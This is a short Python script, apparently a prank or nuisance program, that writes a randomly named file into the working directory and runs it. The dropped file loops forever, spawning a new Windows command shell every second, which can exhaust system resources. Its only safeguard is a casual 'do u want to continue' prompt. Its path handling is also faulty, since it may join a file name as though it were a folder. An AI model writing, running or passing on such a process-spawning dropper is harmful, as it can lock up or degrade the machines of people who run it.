import os
import random
import time
f = open('main.py','r')
a = f.read()
f.close()
input('do u want to continue')
c = str(random.choice(os.listdir(os.getcwd()))+'\\'+'main'+str(random.randint(1, 100000))+'.py')
print(c)
f = open(c,'w')
f.write('''import time
import os
while True:
  time.sleep(1)
  os.system("cmd")''')
f.close()
os.system(f'py {c}')